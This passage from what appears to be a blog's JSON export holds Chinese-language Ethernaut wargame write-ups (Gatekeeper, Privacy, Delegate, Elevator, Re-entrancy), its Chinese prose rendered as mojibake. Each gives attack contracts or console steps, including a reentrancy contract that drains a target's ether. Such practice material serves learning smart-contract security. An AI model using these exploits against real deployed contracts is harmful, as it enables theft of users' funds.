´è§£ï¼Œç›´åˆ°å®ƒèµ·ä½œç”¨ä¸ºæ­¢ã€‚è¿™æ˜¯ä»£ç ç¤ºä¾‹ï¼š for (uint256 i = 0; i &lt;= 8191; i++) &#123; try victim.enter&#123;gas: 800000 + i&#125;(gateKey) &#123; console.log(&quot;passed with gas -&gt;&quot;, 800000 + i); break; &#125; catch &#123;&#125; &#125; 123456789101112131415161718192021222324252627282930313233 ä½ ä»ä¸€ä¸ªåŸºæœ¬çš„ gas å€¼å¼€å§‹åªæ˜¯ä¸ºäº†ç¡®ä¿äº¤æ˜“ä¸ä¼šå› ä¸º Out of Gas å¼‚å¸¸è€Œæ¢å¤ï¼Œç„¶åä½ è¯•å›¾æ‰¾åˆ°å“ªä¸ª gas å€¼å¯ä»¥ä½¿äº¤æ˜“æˆåŠŸã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ˆsolidity ç¼–è¯‘å™¨ + ä¼˜åŒ–æ ‡å¿—ï¼‰æ­£ç¡®çš„ gas å€¼æ˜¯ï¼š**802929** å…³å¡ 3ï¼šé“¸é€ å¦‚ä½•åœ¨ Solidity ä¸­å·¥ä½œ è¦è§£å†³æœ€ç»ˆå…³å£ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä»ä¸€ç§ç±»å‹åˆ°å¦ä¸€ç§ç±»å‹çš„è½¬æ¢ä»¥åŠå‘ä¸‹è½¬æ¢çš„å·¥ä½œåŸç†ã€‚Solidity æ–‡æ¡£å¯¹å…¶è¿›è¡Œäº†å¾ˆå¥½çš„è§£é‡Šï¼š - [Solidity æ–‡æ¡£ï¼šåŸºæœ¬ç±»å‹ä¹‹é—´çš„è½¬æ¢](https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types) - [Solidity æ–‡æ¡£ï¼šæ–‡å­—å’ŒåŸºæœ¬ç±»å‹ä¹‹é—´çš„è½¬æ¢](https://docs.soliditylang.org/en/latest/types.html#conversions-between-literals-and-elementary-types) å½“æ‚¨ä»è¾ƒå°çš„ç±»å‹è½¬æ¢ä¸ºè¾ƒå¤§çš„ç±»å‹æ—¶ï¼Œæ²¡æœ‰é—®é¢˜ã€‚æ‰€æœ‰çš„é«˜ä½éƒ½ç”¨é›¶å¡«å……ï¼Œå€¼ä¸å˜ã€‚é—®é¢˜æ˜¯å½“æ‚¨å°†è¾ƒå¤§çš„ç±»å‹è½¬æ¢ä¸ºè¾ƒå°çš„ç±»å‹æ—¶ã€‚æ ¹æ®å€¼çš„ä¸åŒï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°æ•°æ®ä¸¢å¤±çš„æƒ…å†µï¼Œå› ä¸ºé‚£äº›é«˜é˜¶ä½ä¼šä¸¢å¤±å¹¶è¢«æˆªæ–­ã€‚ä¾‹å¦‚ï¼Œ`uint16(0x0101)`æ˜¯`257`åè¿›åˆ¶çš„ï¼Œä½†å¦‚æœä½ å‘ä¸‹è½¬æ¢å®ƒï¼Œ`uint8`å®ƒå°†æ˜¯`1`åè¿›åˆ¶çš„ï¼- 2.2 [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=hOQWIIx5SRc) å†™çš„æ”»å‡»åˆçº¦- ```solidity interface IGateKeeperOne &#123; function entrant() external view returns (address); function enter(bytes8) external returns (bool); &#125; contract Hack &#123; function enter (address _target, uint256 gas) external &#123; IGateKeeperOne target = IGateKeeperOne(_target); uint16 k16 = uint16(uint160(tx.origin)); uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); bytes8 key = bytes8(k64); require(gas &lt; 8191, &quot;gas &gt; 8191&quot;); require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &quot;failed&quot;); &#125; &#125; 3.è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xAd682B7a072dc407361a23D0C9Ee9f1C16dEa187 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œè°ƒç”¨enter() å‡½æ•°ï¼Œå°†å…³å¡å®ä¾‹åœ°å€ä¼ å…¥enter() å‡½æ•°ä¸­ï¼Œå¹¶è®¾ç½®gas &#x3D; 256 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Privacy","slug":"Smart contracts/ethernaut/Privacy","date":"2023-01-09T02:16:15.000Z","updated":"2023-01-09T02:16:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Privacy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Privacy/","excerpt":"","text":"Privacy1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸ªåˆçº¦çš„åˆ¶ä½œè€…éå¸¸å°å¿ƒçš„ä¿æŠ¤äº†æ•æ„ŸåŒºåŸŸçš„ storage.è§£å¼€è¿™ä¸ªåˆçº¦æ¥å®Œæˆè¿™ä¸€å…³.è¿™äº›å¯èƒ½æœ‰å¸®åŠ©: ç†è§£ storage çš„åŸç† ç†è§£ parameter parsing çš„åŸç† ç†è§£ casting çš„åŸç† 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Privacy &#123; bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(block.timestamp); bytes32[3] private data; constructor(bytes32[3] memory _data) &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^` .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*., *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^ ,---/V\\ `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*. ~|__(o.o) ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39; UU UU */ &#125; 123456789101112131415161718192021222324252627282930313233343536373839## 2. åˆ†æ- 2.1 ç›®æ ‡ï¼šå°†lockedä¿®æ”¹ä¸ºfalse - `bool public locked`åˆå§‹åŒ–ä¸º true å¹¶ä¿å­˜å¿…é¡»è®¾ç½®ä¸º false æ‰èƒ½èµ¢å¾—æŒ‘æˆ˜çš„å€¼ - `bytes32[3] private data`æ˜¯å­˜å‚¨æˆ‘ä»¬çš„å¯†é’¥çš„å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾å‡º`data[2]`è§£å†³æŒ‘æˆ˜çš„ä»·å€¼- 2.2 æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰å…¶ä»–å˜é‡ä»…è§†ä¸ºâ€œå­˜å‚¨å¡«å……â€ï¼Œä»¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦è¯»å–çš„å†…å®¹ ( `data[2]`) ä»¥è§£å†³æŒ‘æˆ˜ã€‚ - `constructor(bytes32[3] memory _data)`åˆå§‹åŒ–`data`å˜é‡çš„å€¼ - ç„¶åæˆ‘ä»¬åªéœ€æ£€æŸ¥æˆ‘ä»¬ä¼ é€’çš„è¾“å…¥`unlock(bytes16 _key)`æ˜¯å¦ä¸å€¼åŒ¹é…ã€‚å¦‚æœæ¯”è¾ƒè¿”å› trueï¼Œæˆ‘ä»¬å°±**è§£é”äº†**åˆçº¦ï¼Œé€šè¿‡äº†æŒ‘æˆ˜ã€‚`byte16 _key``data[2]``true`- 2.3 `data`é¦–å…ˆï¼Œå¿…é¡»æ£€ç´¢å˜é‡ä¸­çš„æ•°æ®ã€‚è¿™å¯ä»¥é€šè¿‡ä»åŒºå—é“¾ä¸Šçš„åˆçº¦å­˜å‚¨ä¸­æå–æ•°æ®æ¥å®Œæˆã€‚åœ¨ brownie ä¸­ï¼Œè¿™å¯ä»¥ä½¿ç”¨ æ¥å®Œæˆ`web3.eth.getStorageAt()`ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆçº¦çš„åœ°å€ï¼Œä»¥åŠè¦æŸ¥çœ‹çš„åˆçº¦å­˜å‚¨æ§½çš„æ–¹å‘ã€‚æ¯ä¸ªæ§½çš„å®¹é‡ä¸º 32 å­—èŠ‚ï¼ˆ256 ä½ï¼‰ï¼Œè¿™æ„å‘³ç€å®é™…å¡«æ»¡ 32 å­—èŠ‚æ§½çš„æ•°æ®ç±»å‹å°†å ç”¨æ•´ä¸ªæ§½ï¼Œå› æ­¤åç»­æ•°æ®ç±»å‹å°†æ»šåŠ¨åˆ°ä¸‹ä¸€ä¸ªæ§½ã€‚å¦‚æœæ•°æ®ç±»å‹å£°æ˜ä¸º`uint256`æˆ–`bytes32`ï¼Œå®ƒå°†å§‹ç»ˆå ç”¨ä¸€ä¸ªå®Œæ•´çš„å­˜å‚¨æ§½ï¼Œå› ä¸ºè¿™äº›ç±»å‹çš„å¤§å°å·²ç»æ˜¯ 32 å­—èŠ‚ã€‚ åœ¨éšç§åˆçº¦çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“ç›¸å…³æ•°æ®æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ `data`ã€‚å› æ­¤ï¼Œè¦æå–è¿™ä¸ªï¼Œæˆ‘ä»¬å¿…é¡»ç¡®å®šè¿™æ¡æ•°æ®åœ¨*å“ªé‡Œï¼Œåœ¨ä»€ä¹ˆå­˜å‚¨æ§½ä¸­ã€‚*- 2.4 [å‚è€ƒåšå®¢](https://dac.ac/blog/ethernaut_solutions/#delegation)- ![image-20230224230120932](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020025595.png)- 2.5 åœ¨æµè§ˆå™¨æ§åˆ¶å°ä¾æ¬¡æ‰§è¡Œ **web3.eth.getStorageAt() ** ï¼Œ**data.slice(0,34)** å‘½ä»¤## 3 .è§£é¢˜- 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0- 3.2 ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹ä»£ç å¾—åˆ° data[2] - ```solidity addr = &quot;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&quot; &#x27;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&#x27; await web3.eth.getStorageAt(addr, 5) &#x27;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#x27; data = &quot;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&quot; &#x27;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#x27; data.slice(0,34) &#x27;0xa9cbb829703de0df913fc95cc78d10df&#x27; 3.3 è°ƒç”¨å®ä¾‹éƒ¨ç½²çš„åˆçº¦ï¼Œå¹¶æŸ¥çœ‹locked çš„å€¼ä¸ºtrue 3.4 å°†æ‰§è¡Œdata.slice(0,34) å¾—åˆ°çš„å€¼ä¼ å…¥unlockçš„å½¢å‚ä¸­ï¼Œå¹¶è°ƒç”¨unlock() å‡½æ•° 3.5 æŸ¥çœ‹lockedçš„å€¼ï¼Œå€¼ç”±true å˜æˆ false 3.6 æäº¤å®ä¾‹ 3.7 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Delegate","slug":"Smart contracts/ethernaut/Delegate","date":"2023-01-09T01:32:10.000Z","updated":"2023-01-09T01:32:10.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Delegate/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Delegate/","excerpt":"","text":"Delegate1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ç”³æ˜ä½ å¯¹ä½ åˆ›å»ºå®ä¾‹çš„æ‰€æœ‰æƒ. è¿™å¯èƒ½æœ‰å¸®åŠ© ä»”ç»†çœ‹solidityæ–‡æ¡£å…³äº delegatecall çš„ä½çº§å‡½æ•°, ä»–æ€ä¹ˆè¿è¡Œçš„, ä»–å¦‚ä½•å°†æ“ä½œå§”æ‰˜ç»™é“¾ä¸Šåº“, ä»¥åŠä»–å¯¹æ‰§è¡Œçš„å½±å“. Fallback æ–¹æ³• æ–¹æ³• ID 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Delegate &#123; address public owner; constructor(address _owner) &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125; &#125; contract Delegation &#123; address public owner; Delegate delegate; constructor(address _delegateAddress) &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; fallback() external &#123; (bool result,) = address(delegate).delegatecall(msg.data); if (result) &#123; this; &#125; &#125; &#125; 2. åˆ†æ 2.1 elegation.sol è¿™æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®çš„åˆçº¦ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹ã€‚å®ƒæœ‰ä¸¤ä¸ªçŠ¶æ€å˜é‡ï¼š address public ownerå­˜å‚¨åˆçº¦æ‰€æœ‰è€…çš„å…¬å…±å˜é‡ Delegate delegate``Delegateå¯¹æˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„åˆåŒçš„å¼•ç”¨ åˆçº¦constructorçš„ å°†å…¶address _delegateAddressä½œä¸ºå”¯ä¸€çš„è¾“å…¥å‚æ•°ï¼Œdelegateç”¨å®ƒåˆå§‹åŒ–çŠ¶æ€å˜é‡å¹¶ç”¨ åˆå§‹åŒ–æ‰€æœ‰è€…msg.sender 2.2 é€šè¿‡ä¿®æ”¹ç‡ƒæ–™é™åˆ¶çš„æ–¹æ³•ï¼Œå‡ºé”™äº†ã€‚ã€‚ã€‚ å¼€å§‹ç½‘ä¸Šå¯»æ‰¾è§£å†³æ–¹æ³•ï¼Œè§£å†³æ–¹æ³•ï¼šä¿®æ”¹ç¼–è¾‘ç‡ƒæ–™è´¹é€‰é¡¹ä¸º â€œé«˜çº§â€ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x6eE471bd0AE8A991C76972ADB0365D7cfC4e3fE9 3.2 é€šè¿‡å®ä¾‹åœ°å€è°ƒç”¨åˆçº¦ 3.3 è°ƒç”¨Dlegateåˆçº¦ä¸­çš„ pwn()å‡½æ•°ï¼Œå°†ç‡ƒæ–™é™åˆ¶ä»29328ä¿®æ”¹ä¸º39328 3.3 å‘ç°åšé”™äº† wwwwâ€¦.. å¼„äº†å¥½ä¹…ï¼ŒåŸæ¥æ˜¯éœ€è¦ä¿®æ”¹ç¼–è¾‘ç‡ƒæ–™è´¹é€‰é¡¹, å°†å…¶è®¾ç½®ä¸ºâ€œé«˜çº§â€ 3.4 å†æ¬¡è°ƒç”¨pwn() å‡½æ•°ï¼Œåœ°å€ä¿®æ”¹æˆåŠŸ 3.5 åˆ°EtherScan æŸ¥çœ‹äº¤æ˜“è®°å½•ï¼Œå‘ç°æˆåŠŸè°ƒç”¨pwnå‡½æ•° 3.6 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.7 æˆåŠŸï¼ï¼ï¼ï¼ tipsï¼š1.å‚è€ƒåšå®¢ 2. å‚è€ƒè§†é¢‘","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Elevator","slug":"Smart contracts/ethernaut/Elevator ","date":"2023-01-08T13:16:15.000Z","updated":"2023-01-08T13:16:15.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Elevator /","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Elevator%20/","excerpt":"","text":"Elevator1. é¢˜ç›®è¦æ±‚ 1.1 ç”µæ¢¯ä¸ä¼šè®©ä½ è¾¾åˆ°å¤§æ¥¼é¡¶éƒ¨, å¯¹å§? è¿™å¯èƒ½æœ‰å¸®åŠ©: æœ‰çš„æ—¶å€™ solidity ä¸æ˜¯å¾ˆæ“…é•¿ä¿å­˜ promises. è¿™ä¸ª ç”µæ¢¯ æœŸå¾…è¢«ç”¨åœ¨ä¸€ä¸ª å»ºç­‘ é‡Œ. 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Building &#123; function isLastFloor(uint) external returns (bool); &#125; contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125; &#125; 123456789101112131415161718192021222324252627282930## 2. åˆ†æ#### tipsï¼š [å‚è€ƒåšå®¢](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1 `isLastFloor()`çš„è¿”å›å€¼å¿…é¡»ä¸º False æ‰èƒ½`floor`æ›´æ”¹å¹¶å˜ä¸º`top`trueã€‚æˆ‘æƒ³åˆ°äº†ä¸¤ç§æ–¹æ³•ï¼š 1. æˆ‘ä»¬è®©æˆ‘ä»¬çš„é¡¶å±‚ä¸æ˜¯ 0ï¼ˆ çš„èµ·å§‹å€¼`floor`ï¼‰å¹¶ä¸”æˆ‘ä»¬æ£€æŸ¥æ˜¯å¦`floor`æ˜¯é¡¶å±‚çš„æ•°å€¼ã€‚ç„¶åæˆ‘ä»¬å®šä¹‰å‡½æ•°è¿”å›å½“å‰å€¼å’Œé¡¶å±‚å€¼`isLastFloor()`ä¹‹é—´çš„æ¯”è¾ƒã€‚`floor` 2. æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå°†ç”µæ¢¯å‘é€åˆ°å…¶å½“å‰æ¥¼å±‚ (0) çš„å‡½æ•°ï¼Œä½†æˆ‘ä»¬è¿è¡Œæ­¤å‡½æ•°ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬ç¡®ä¿è¿”å›`isLastFloor()`falseï¼Œç„¶åä»…è¿”å› trueã€‚è¿™å®é™…ä¸Šæ„å‘³ç€æˆ‘ä»¬çš„é¡¶å±‚æ˜¯ 0 å±‚ã€‚ä½†æ˜¯åœ¨ç¬¬äºŒæ¬¡è¿è¡ŒæœŸé—´ï¼Œ`top`å˜æˆäº†çœŸçš„ã€‚- 2.2 [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=IfljmOqThvI) å†™çš„æ”»å‡»åˆçº¦- ```solidity contract Hack &#123; Elevator private immutable target; uint private count; constructor(address _target) &#123; target = Elevator(_target); &#125; function pwn() external &#123; target.goTo(1); require(target.top(), &quot;not top&quot;); &#125; function isLastFloor(uint) external returns (bool) &#123; count++; return count &gt; 1; &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š 0x156b4F96D63961020a9fe45947d4eAB6F4053aA8 3.2 é€šè¿‡å®ä¾‹åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ï¼š 3.3 è°ƒç”¨pwn() å‡½æ•° 3.4 æäº¤å®ä¾‹æŸ¥çœ‹ç»“æœ 3.5 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Re-entrancy","slug":"Smart contracts/ethernaut/Re-entrancy","date":"2023-01-08T10:13:13.000Z","updated":"2023-01-08T10:13:13.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Re-entrancy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Re-entrancy/","excerpt":"","text":"Re-entrancy1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§. è¿™äº›å¯èƒ½æœ‰å¸®åŠ©: ä¸å¯ä¿¡çš„åˆçº¦å¯ä»¥åœ¨ä½ æ„æ–™ä¹‹å¤–çš„åœ°æ–¹æ‰§è¡Œä»£ç . Fallback methods æŠ›å‡º&#x2F;æ¢å¤ bubbling æœ‰çš„æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦çš„æœ€å¥½æ–¹å¼æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦. æŸ¥çœ‹ä¸Šæ–¹å¸®åŠ©é¡µé¢, â€œBeyond the consoleâ€ éƒ¨åˆ† 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.6.12; import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; receive() external payable &#123;&#125; &#125; 123456789101112131415161718## 2. åˆ†æ#### tips: [å‚è€ƒåšå®¢](https://stermi.medium.com/the-ethernaut-challenge-9-solution-re-entrancy-635303881a4f)- 2.1 åˆ†æä»£ç - ```solidity function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; - a.è¯¥åŠŸèƒ½æ£€æŸ¥æ˜¯å¦`msg.sender`æœ‰è¶³å¤Ÿçš„ä½™é¢æ¥æå–`_amount`ä»¥å¤ªå¸ - b.`_amount`å®ƒç»§ç»­é€šè¿‡ä¸€ä¸ªä½çº§å‡½æ•°å‘é€è¯·æ±‚ï¼Œ`call`è¯¥å‡½æ•°å°†ä½¿ç”¨æ‰€æœ‰å‰©ä½™çš„`gas`æ¥æ‰§è¡Œæ“ä½œ - c.å®ƒæ›´æ–°`msg.sender`å‡å°‘é‡‘é¢çš„ä½™é¢ &#96;æ¼æ´åˆ©ç”¨é€‰é¡¹ 1ï¼Œæ‡’æƒ°è€Œä¸èªæ˜çš„é€‰é¡¹ï¼šåœ¨å¾ªç¯ä¸­åˆ©ç”¨é‡å…¥ å¦‚æœèµ„é‡‘ä¸æ˜¯é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥0.001 ether / 100é€šè¿‡donateå‡½æ•°å‘é€å¹¶é‡æ–°è¿›å…¥withdrawå‡½æ•° 100 æ¬¡ + åˆå§‹è°ƒç”¨ã€‚ 0.001 ether / 100åªæ˜¯ä¸€ä¸ªä»»æ„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®ä¿åœ¨é‡æ–°è¿›å…¥å‡½æ•°æ—¶ä¸ä¼šæ¶ˆè€—å¤ªå¤šæ°”ä½“ï¼Œwithdrawå¦åˆ™äº¤æ˜“ä¼šå› ä¸ºOut of Gas å¼‚å¸¸è€Œæ¢å¤ã€‚ æ¼æ´åˆ©ç”¨é€‰é¡¹ 2ï¼Œåˆ‡è‚‰åˆ€æ–¹å¼ï¼šåˆ©ç”¨é‡å…¥å’Œä¸‹æº¢ è¿™ä¸ªè§£å†³æ–¹æ¡ˆè¦ä¼˜é›…å¾—å¤šï¼Œå®ƒåˆ©ç”¨äº†ä¸¤ä¸ªä¸åŒçš„é—®é¢˜ï¼šé‡å…¥å’Œä¸‹æº¢ï¼ æˆ‘ä»¬å·²ç»çŸ¥é“é‡å…¥é—®é¢˜ï¼Œå¹¶ä¸”æˆ‘ä»¬è¯´balances[msg.sender] -= _amountâ€œæ­£å¸¸â€æ“ä½œçš„ä¸‹æº¢å°†å—åˆ°ä¿æŠ¤ï¼Œå› ä¸ºbalances[msg.sender] &gt;= _amountå³ä½¿è¯¥æ“ä½œä¸ä½¿ç”¨SafeMathï¼Œå¦‚æœæˆ‘ä»¬ç¡®å®š maxï¼Œä¹Ÿæ²¡æœ‰åŠæ³•ä¸‹æº¢å¯èƒ½balances[msg.sender]ä¼šå½’é›¶ã€‚ ä½†æ˜¯å› ä¸ºæˆ‘ä»¬å¯ä»¥é‡æ–°è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸¤æ¬¡ç›¸åŒçš„balances[msg.sender] -= _amountæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä½™é¢ç¬¬ä¸€æ¬¡ä¼šå˜ä¸ºé›¶ï¼Œä½†ç¬¬äºŒæ¬¡ä¼štype(uint256).maxå› ä¸ºä¸‹æº¢è€Œå˜ä¸ºé›¶ï¼ æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨withdrawæå–å­˜å‚¨åœ¨å—å®³è€…åˆçº¦ä¸­çš„å…¨éƒ¨ä»¥å¤ªå¸ï¼ æ³¨æ„ï¼šç¬¬äºŒç§è§£å†³æ–¹æ¡ˆåªæœ‰åœ¨ä¸‹æº¢çš„æƒ…å†µä¸‹æ‰æœ‰å¯èƒ½ã€‚å¦‚æœä¸å­˜åœ¨ä¸‹æº¢é—®é¢˜ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡é‡å…¥å¾ªç¯è§£å†³æ–¹æ¡ˆæ¥è§£å†³æŒ‘æˆ˜ã€‚&#96; 2.2 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦: interface IReentracy &#123; function donate(address) external payable; function withdraw(uint256) external; &#125; contract Hack&#123; IReentracy private immutable target; constructor(address _target) public &#123; target = IReentracy(_target); &#125; function attack() public payable&#123; target.donate.value(0.001 ether)(address(this)); target.withdraw(1e18); &#125; receive() external payable &#123; uint amount = min(1e18, address(target).balance); if (amount &gt; 0) &#123; target.withdraw(amount); &#125; require(address(target).balance == 0, &quot;target balance &gt; 0&quot;); selfdestruct(payable(msg.sender)); &#125; function min(uint x, uint y) private pure returns(uint) &#123; return x &lt;= y ? x : y; &#125; &#125; 2.3 è¿›è¡Œé‡å…¥æ”»å‡»å³å¯ 3. è§£é¢˜ 3.1 è·å–å…³å¡çš„å®ä¾‹ï¼š0xcf96fB43ffF6B6F8c05f353ce8271931271E69b0 3.2 åˆ©ç”¨å®ä¾‹åœ°å€éƒ¨ç½²Hackåˆçº¦ï¼Œè°ƒç”¨attrack() å‡½æ•° è®¾ç½®msg.value &#x3D; 1 ether 3.3 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.4 æˆåŠŸï¼ï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"King","slug":"Smart contracts/ethernaut/King","date":"2023-01-08T08:17:13.000Z","updated":"2023-01-08T08:17:13.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/King/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/King/","excerpt":"","text":"King1. é¢˜ç›®è¦æ±‚ 1.1 